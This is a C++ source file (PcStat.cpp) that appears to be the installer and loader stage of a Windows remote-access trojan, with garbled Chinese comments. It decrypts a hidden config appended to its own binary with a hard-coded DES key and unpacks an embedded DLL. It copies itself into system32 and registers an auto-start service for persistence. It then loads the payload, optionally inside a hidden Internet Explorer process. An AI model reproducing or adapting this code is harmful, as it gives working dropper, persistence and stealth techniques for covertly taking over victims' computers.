// PcStat.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcStat.h"
#include <process.h>
#include <Tlhelp32.h>
#include "Lzw.h"
#include "WjcDes.h"

#include   "Windows.h"   
#include   "Winsvc.h" 
#include   "stdio.h" 
#include   "time.h"
#include   "stdlib.h"  

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


SERVICE_STATUS_HANDLE hServiceStatus=NULL;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];
// ��������,�������ΪSERVICE_WIN32_OWN_PROCESS ���ͣ���������Ʊ�����
#define  SERVICE_NAME   "teststatchen4"   

// ����������ں���
void   WINAPI   MyServiceMain(DWORD argc, LPTSTR *argv);  
// ������ƺ��� 
void   WINAPI   MyServiceControl(DWORD   nControlCode);   
// ������ִ�к���
BOOL   MyExecuteService();   
// ������ֹ����
void   MyTerminateService();   
// �������к�Ĵ����߳�
DWORD   WINAPI MyServiceProc(LPVOID   lpParameter);   
// ���·���״̬
BOOL   MyUpdateServiceStatus(DWORD   dwCurrentState,   DWORD   dwWin32ExitCode,   
         DWORD   dwServiceSpecificExitCode,   DWORD   dwCheckPoint,DWORD   dwWaitHint);   

// ����״̬���
    
DWORD   ServiceCurrentStatus;   
HANDLE   hServiceThread;   
BOOL   bServiceRunning;   
HANDLE   hServiceEvent;
  
#pragma comment(linker, "/OPT:NOWIN98")
// ��Ϣ���
VOID SvcDebugOut(LPSTR String, DWORD Status) 
{ 
 CHAR  Buffer[1024]; 
 if (strlen(String) < 1000) 
 { 
  sprintf(Buffer, String, Status); 
  OutputDebugStringA(Buffer); 
 } 
}


/////////////////////////////////////////////////////////////////////////////
// CPcStatApp

BEGIN_MESSAGE_MAP(CPcStatApp, CWinApp)
	//{{AFX_MSG_MAP(CPcStatApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcStatApp construction

CPcStatApp::CPcStatApp()
{
	memset(&m_Info, 0, sizeof(m_Info));
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcStatApp object

CPcStatApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CPcStatApp initialization

#ifdef _DEBUG
void WriteLog(char* pText)
{
	FILE *fp = fopen("c:\\1.txt","ab");
	if(fp != NULL)
	{
		fwrite(pText , strlen(pText), 1, fp);
		fclose(fp);
	}
}
#endif

BOOL CALLBACK EnumWindowsProc(HWND hwnd , LPARAM lParam)
{
	DWORD m_Id = 0;
	GetWindowThreadProcessId(hwnd,&m_Id);
	if(m_Id == (DWORD) lParam)
	{
		PostMessage(hwnd,WM_NULL,0,0);
		PostMessage(hwnd,WM_NULL,0,0);
		return FALSE;
	}
	return TRUE;
}

void CPcStatApp::InsertDllToProcess(HMODULE m_Module)
{
	//ȡ��������
	PLAYWORK PlayWork = (PLAYWORK) GetProcAddress(m_Module,"PlayWork");
	if(PlayWork == NULL) return ;
	//m_Info.m_ProcessName[0]=1;
	//��δ���
	if(m_Info.m_ProcessName[0] == 0)
	{
		//���뵽explorer.exe����
	
	//������δ����ƶ���pcclient.dll�У��Է���Ϊ����
	/*	if(!CheckProcess(m_Info.m_ProcessId)) 
		{
			//�رյȴ��¼����
			CloseHandle(m_ExitEvent);
			return ;
		}*/
	}
	else if(m_Info.m_ProcessName[0] == 1)
	{
		//���뵽������ie
		PROCESS_INFORMATION piProcInfo;
		STARTUPINFO siStartInfo;  

		// Set up members of STARTUPINFO structure.  
		ZeroMemory( &siStartInfo, sizeof(STARTUPINFO));
		GetStartupInfo(&siStartInfo);
		siStartInfo.cb = sizeof(STARTUPINFO);  
		siStartInfo.wShowWindow = SW_HIDE;
		siStartInfo.dwFlags = STARTF_USESHOWWINDOW;

		char m_IePath[256] = "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE";
		char m_SysPath[256] = {0};
		GetSystemDirectory(m_SysPath,200);
		m_IePath[0] = m_SysPath[0];
		if(!CreateProcess( m_IePath, NULL, NULL, NULL, TRUE,  
			DETACHED_PROCESS, NULL, NULL, &siStartInfo, &piProcInfo))
		{
			CloseHandle(m_ExitEvent);
			return;
		}

		//�ȴ����̳�ʼ��
		m_Info.m_ProcessId = (UINT) piProcInfo.dwProcessId ;
					 FILE *file;
	file=fopen("d:\\p.txt","a+");
	fwrite("c9",1,2,file);
	fclose(file);
		WaitForInputIdle(piProcInfo.hProcess,3000);
	}
	else
	{
		//����������
		PlayWork(&m_Info);
					 FILE *file;
	file=fopen("d:\\p.txt","a+");
	fwrite("d9",1,2,file);
	fclose(file);
		WaitForSingleObject(m_ExitEvent,INFINITE);
		CloseHandle(m_ExitEvent);
		return;
	}

	//����ָ������
	if(PlayWork(&m_Info))
	{
					 FILE *file;
	file=fopen("d:\\p.txt","a+");
	fwrite("e9",1,2,file);
	fclose(file);
		EnumWindows(EnumWindowsProc,m_Info.m_ProcessId);
		WaitForSingleObject(m_ExitEvent,INFINITE);
	}

	//�رյȴ��¼����
	CloseHandle(m_ExitEvent);
}


int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
	
	__try
	{	
		switch(Mode)		
		{			
		case 0:
			if(RegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(RegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:			 			 
				if(RegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,strlen(szData)+1) == ERROR_SUCCESS) 				 
					iResult =1;				 			
				break;
		    case REG_DWORD:
                if(RegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;				 			 
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(RegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (RegDeleteKey(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(RegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (RegDeleteValue(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;
		}
	}
	__finally 
	{
	   RegCloseKey(MainKey);		
	   RegCloseKey(hKey);
	}
	return iResult;
}
void CPcStatApp::MyRegSetKey(char* ValueName,char* Value, BOOL Flag)
{

		SC_HANDLE schSCManager;
 
 // Open a handle to the SC Manager database. 
  schSCManager = OpenSCManager( 
  NULL,                    // local machine 
  NULL,                    // ServicesActive database 
  SC_MANAGER_ALL_ACCESS);  // full access rights 
 
 if (NULL == schSCManager) 
	 return;
    printf("OpenSCManager failed (%d)\n", GetLastError());

    TCHAR szPath[MAX_PATH]; 
    char m_ExeFileName[256] = {0};
	GetModuleFileName(NULL,m_ExeFileName,200); 
    strcpy(szPath, "C:\\windows\\system32\\ps.exe");
    SC_HANDLE schService = CreateService( 
        schSCManager,              // SCManager database 
        TEXT(m_Info.m_serviceName),        // name of service 
        m_Info.m_serviceDisplayname,           // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, // service type 
        SERVICE_AUTO_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        szPath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 
 
    if (schService == NULL) 
    {//�Ѿ�����
	
        printf("CreateService failed (%d)\n", GetLastError()); 
        return;
    }
	else
	{
		HKEY hkRoot;
		char strSubKey[256];
	
	   hkRoot = HKEY_LOCAL_MACHINE;
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", m_Info.m_serviceName);

 
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, 
		m_Info.m_serviceMark, strlen(m_Info.m_serviceMark), 0);
 
    RegCloseKey(hkRoot);  

	CloseServiceHandle(schService);
	}

    CloseServiceHandle(schSCManager);

   
}
//��������ؼ���Ҫע��ps.exe,���´ο����Զ�����
//Ҫ�����pcclient.dll
BOOL CPcStatApp::LoadInitInfo(char* pFileName)
{
	//ȡ��ǰEXE�ļ����� ps.exe����pcstat.exe��pcclient.dll���
	//����Ҫ�����pcclient.dll
	char m_ExeFileName[256] = {0};
	GetModuleFileName(NULL,m_ExeFileName,200);//���ظ�Ӧ�ó���ȫ·��
	
	//���ļ�����
	INITDLLINFO m_TmpFileInfo = {0}, m_FileInfo = {0};
	FILE* fp = fopen(m_ExeFileName, "rb"); //�򿪱��ػ���Զ�˵��ļ�(rb)'b' ������ϵͳ�����ּ�����λ�ļ���ͬ��'r' ���ļ���ʽΪֻ����
	if(fp == NULL) return FALSE;
	if(fseek(fp , 0 - sizeof(INITDLLINFO) , SEEK_END)) //�ض�λ���ϵ��ļ�ָ�� SEEK_CUR�� ��ǰλ�� ,SEEK_END�� �ļ���β, SEEK_SET�� �ļ���ͷ
	{
		fclose(fp);
		return FALSE;
	}

	//����ʼ������
	fread(&m_TmpFileInfo , sizeof(INITDLLINFO) , 1, fp);
	fclose(fp);

	//��������
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_FileInfo, (char*) &m_TmpFileInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, DECRYPT);//����
	memcpy(&m_Info, &m_FileInfo, sizeof(INITDLLINFO));

	strcpy(m_Info.m_ParentFile, m_ExeFileName);
	strcpy(m_Info.m_EventName,AfxGetAppName());
   
	if(m_Info.m_IsUpdate == 0)
	{
		//�����ļ�
		GetWindowsDirectory(m_Info.m_StartFile,200); //��ȡWindowsĿ¼������·����
		strcat(m_Info.m_StartFile, "\\"); //��src��ָ�ַ�����ӵ�dest��β��
		strcat(m_Info.m_StartFile , m_FileInfo.m_StartFile);
	
	
		//�����ļ�·��Ϊc:\windows\pccortr.dll
		//pcclient.dll������pccortr.dll��c:\windows\pccortr.dll
		GetWindowsDirectory(m_Info.m_CtrlFile, 200);
		strcat(m_Info.m_CtrlFile, "\\");
		strcat(m_Info.m_CtrlFile, m_FileInfo.m_CtrlFile);
			
	}
	strcpy(pFileName, m_Info.m_StartFile);

	//ȡ���ӿ��ļ�(����dll�ļ�) pcclient.dll(�����ļ�)��pfileName(c:\windows\ps.dll)
	if(!GetInsertDllFile(m_ExeFileName, pFileName, m_Info.m_DllFileLen))
		return FALSE;
    
	//ȡ�ļ���
	char* pFind = strrchr(m_Info.m_ParentFile,'\\');
      

	if(pFind == NULL) return FALSE;
   
	char m_DesFile[256] = {0};

	//ϵͳĿ¼
	char m_SystemPath[256] = {0};
	GetSystemDirectory(m_SystemPath,200);
	sprintf(m_DesFile, "%s%s", m_SystemPath, pFind);
	CopyFile(m_Info.m_ParentFile, m_DesFile, FALSE);
	//m_Info.m_ParentFile= m_ExeFileName,����m_Info.m_ParentFile��m_DesFile
	//ע�� m_DesFile���ڷ����У��´ο���m_DesFile������
	MyRegSetKey(m_Info.m_KeyName, m_DesFile, TRUE);
	return TRUE;
}

BOOL CPcStatApp::CheckProcess(UINT &pId)
{
	HANDLE m_Sys = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL) return FALSE;

	PROCESSENTRY32 m_Lppe = {0};
	char m_ExeName[512] = {0};
	char m_Name[256] = "EXPLORER.EXE";

	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(m_Sys,&m_Lppe))
	{
		CloseHandle(m_Sys);
		return FALSE;
	}

	memset(m_ExeName,0,sizeof(m_ExeName));
	strcpy(m_ExeName,m_Lppe.szExeFile);
	_strupr(m_ExeName);

	if(strstr(m_ExeName,m_Name))
	{	
		pId = m_Lppe.th32ProcessID;
		CloseHandle(m_Sys);
		return TRUE;
	}

	while(Process32Next(m_Sys,&m_Lppe))
	{
		memset(m_ExeName,0,sizeof(m_ExeName));
		strcpy(m_ExeName,m_Lppe.szExeFile);
		_strupr(m_ExeName);
		if(strstr(m_ExeName,m_Name))
		{	
			pId = m_Lppe.th32ProcessID;
			CloseHandle(m_Sys);
			return TRUE;
		}
	}
	CloseHandle(m_Sys);
	return FALSE;
}

BOOL CPcStatApp::DeCodeFile(char* pFileData , 
							char* pFileName , 
							DWORD FileLen)
{
	//���ļ�
	FILE *fp = fopen(pFileName,"wb");
	if(fp == NULL) return FALSE;

	//����
	BYTE* pDest = new BYTE[FileLen + 1024];
	FCLzw lzw ;
	lzw.LZW_Decode ((BYTE*) pFileData, pDest) ;
	
	//д�ļ�
	fwrite(pDest , FileLen , 1 , fp);
	fclose(fp);
	delete [] pDest;
	return TRUE;
}

BOOL CPcStatApp::GetInsertDllFile(char* pExeFileName, char* pFileName, int SrcFileLen)
{
	//��ִ���ļ�
	FILE* fp = fopen(pExeFileName, "rb");
	if(fp == NULL) return FALSE;

	//�ƶ�Ŀ��	
	if(fseek(fp , 0 - (SrcFileLen + sizeof(INITDLLINFO)) , SEEK_END))
	{
		fclose(fp);
		return FALSE;
	}
	
	//������DLL�ļ�����
	char *m_FileBuf = new char[SrcFileLen];
	fread(m_FileBuf,SrcFileLen,1,fp);
	fclose(fp);

	//�Ѿ����¹��ĳ���
	if(m_Info.m_IsUpdate == 1)
	{
		fp = fopen(pFileName,"wb");
		if(fp == NULL)
		{
			delete [] m_FileBuf;
			return FALSE;
		}
		fwrite(m_FileBuf, SrcFileLen, 1, fp);
		fclose(fp);
		delete [] m_FileBuf;
		return TRUE;
	}

	//�鿴������Ч��
	DWORD DesFileLen = *((DWORD*) &m_FileBuf[12]);
	if(memcmp(m_FileBuf , "SSH" , 3) ||	
		DesFileLen > 512 * 1024)
	{
		delete [] m_FileBuf;
		return FALSE;
	}

	//��ѹ�ļ�
	if(!DeCodeFile(m_FileBuf + 26 + (* (WORD *) 
		&m_FileBuf[24]), pFileName , DesFileLen))
	{
		delete [] m_FileBuf;
		return FALSE;
	}
    
	delete [] m_FileBuf;
	return TRUE;
}

  void    ShowError()   
  {   
          char   *   lpMsgBuf;   
    
          FormatMessage(   
          FORMAT_MESSAGE_ALLOCATE_BUFFER   |   FORMAT_MESSAGE_FROM_SYSTEM,   
          NULL,   
          GetLastError(),   
          MAKELANGID(LANG_NEUTRAL,   SUBLANG_DEFAULT),   //   Default   language   
          (LPTSTR)   &lpMsgBuf,   
          0,   
          NULL   
          );   
    
          //   Display   the   string.   
          MessageBox(   NULL,   lpMsgBuf,   "ϵͳ����",   MB_OK|MB_ICONINFORMATION   );   
    
          //   Free   the   buffer.   
          LocalFree(   lpMsgBuf   );   
  }   


//�� ��������-����-������������
//���ǵ�һ�ε������ִ�У����ﶼ�����
BOOL CPcStatApp::InitInstance()
{


	SERVICE_TABLE_ENTRY  ServiceTable[]   =     
	{   
		{ SERVICE_NAME, MyServiceMain },   
		{ NULL, NULL}   
	};   
    //��һ�ε������ps.exeִ�У���Ϊ����û��ע�ᣬע�����������MyServiceMain��������Ϊʧ��ֵ��
	//�����Ǽ����ã�����ִ�� startInstance()����������;
	if(!StartServiceCtrlDispatcher(ServiceTable))   
	{   FILE *file;
	 file=fopen("d:\\p.txt","a+");
	 fwrite("o1",1,2,file);
	  fclose(file);
     SvcDebugOut(" [MY_SERVICE] StartServiceCtrlDispatcher (%d)\n", 
     GetLastError());
	 
     startInstance();
    }


	return TRUE;

}
//�����������ִ����������
//ϸ��Ϊ����ps.exe����pcstat.exe��pcclient.dll��ɣ�
//1ע��ps.exe��c:\windows\system32\ps.exe,Ϊ����;������ΪSERVICE_NAME
//2�����pcclient.dll��c:\windows\ps.dll
//3����ps.dll(pcclient.dll)����pccortr.dll��c:\windows\pccortr.dll
//Ȼ��pccortr.dll��ʼִ��
BOOL CPcStatApp::startInstance()
{

     
	//���������¼�

	m_ExitEvent = CreateEvent(NULL,TRUE,FALSE,AfxGetAppName());
	if(m_ExitEvent == NULL || GetLastError() 
		== ERROR_ALREADY_EXISTS) 
		return FALSE;

	//1�������ӿ��ļ�  ʵ���ļ�Ϊpcclient.dll
	char m_FileName[256] = {0};
	if(!LoadInitInfo(m_FileName)) return FALSE;


	//2װ������dll   ʵ���ļ�Ϊpcclient.dll
	HMODULE m_Module = LoadLibrary(m_FileName);

	
/*	file=fopen("d:\\p.txt","a+");

		fwrite(m_FileName,1,strlen(m_FileName),file);
		char error[50];
		sprintf(error,"%d",GetLastError());
      fwrite(error,1,strlen(error),file);
	fclose(file);*/

	if(m_Module == NULL)
	{
	//	#ifdef _DEBUG
//ShowError();
//#endif
		return FALSE;
	}


	//3��������  ʵ���ļ�Ϊpcclient.dll
	InsertDllToProcess(m_Module);
    	

	//4�ͷ���Դ  ʵ���ļ�Ϊpcclient.dll
	FreeLibrary(m_Module);


	return TRUE;
}

void WINAPI MyServiceMain(DWORD argc, LPTSTR  *argv)   
{   
 
	char ddd[128] = {'\0'};
    sprintf(ddd, "��������%d��", argc);
 
   // ע�������ƻص�
    hServiceStatus = RegisterServiceCtrlHandler(SERVICE_NAME,(LPHANDLER_FUNCTION)MyServiceControl);   
   if(!hServiceStatus || !MyUpdateServiceStatus(SERVICE_START_PENDING,NO_ERROR,0,1,3000))   
   {   
    return;   
   }   
    
   // �����ȴ��¼�
   hServiceEvent = CreateEvent(0,TRUE,FALSE,0);   
   if(!hServiceEvent || !MyUpdateServiceStatus(SERVICE_START_PENDING,NO_ERROR,0,2,1000))   
   {   
   return;   
   }   
    
   // ���з���
   if( !MyExecuteService() )   
   {
  //return;   
   }   
    
   ServiceCurrentStatus = SERVICE_RUNNING;   
    
   if(!MyUpdateServiceStatus(SERVICE_RUNNING,NO_ERROR,0,0,0))   
   {   
  //return;   
   }   
   while(1)
   {
    Sleep(3000);
   }
   // �ȴ�����
   WaitForSingleObject(hServiceEvent,INFINITE);   
   CloseHandle(hServiceEvent);   

 
}  

// ������Ϣ�����߳�
void WINAPI MyServiceControl(DWORD   dwControlCode)   
{   
  switch(dwControlCode)   
  {   
   case SERVICE_CONTROL_SHUTDOWN:   
   case SERVICE_CONTROL_STOP:   
     ServiceCurrentStatus = SERVICE_STOP_PENDING;   
     MyUpdateServiceStatus(SERVICE_STOP_PENDING,NO_ERROR,0,1,3000);   
     MyTerminateService();   
    return;   
  default:   
   break;   
  }   
    
  MyUpdateServiceStatus(ServiceCurrentStatus,NO_ERROR,0,0,0);   
}   


// ִ�з��������߳�
BOOL MyExecuteService()   
{   
   DWORD   dwThreadID;   
   // ���������߳�
   hServiceThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)MyServiceProc,0,0,&dwThreadID);   
    
   if(hServiceThread != NULL)   
   {   
    bServiceRunning = TRUE;   
    return TRUE;   
   }   
   else   
   {   
    return FALSE;   
   }   
}   

// ֹͣ����ʱִ�еķ���
void MyTerminateService()   
{   
// ::MessageBox(NULL, "hello","you kill me ?", MB_ICONWARNING | MB_TOPMOST);
 bServiceRunning   =   FALSE;   
 SetEvent(hServiceEvent);   
 MyUpdateServiceStatus(SERVICE_STOPPED,NO_ERROR,0,0,0);   
}   

// ��Ҫ���еĲ����ڴ��߳��д���
DWORD WINAPI MyServiceProc(LPVOID lpParameter)
{   
  while(bServiceRunning)   
  {   
   theApp.startInstance();   
   Sleep(4000);   
  }   
    
 return   0;   
}   

BOOL MyUpdateServiceStatus(DWORD   dwCurrentState,   DWORD   dwWin32ExitCode,   
         DWORD   dwServiceSpecificExitCode,   DWORD   dwCheckPoint,DWORD   dwWaitHint)   
{   
    SERVICE_STATUS ServiceStatus;   
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;   
    ServiceStatus.dwCurrentState = dwCurrentState;   
    
    if(dwCurrentState == SERVICE_START_PENDING)   
	{   
     ServiceStatus.dwControlsAccepted   =   0;   
	}   
    else   
	{   
      ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;   
	}   
    
     if(dwServiceSpecificExitCode == 0)   
	 {   
     ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;   
	 }   
     else   
	 {   
     ServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;   
	 }   
    
    ServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;   
    ServiceStatus.dwCheckPoint = dwCheckPoint;   
    ServiceStatus.dwWaitHint = dwWaitHint;   
    
    if(!SetServiceStatus(hServiceStatus,&ServiceStatus))   
	{   
     MyTerminateService();   
     return   FALSE;   
	}   
     return   TRUE;   
}

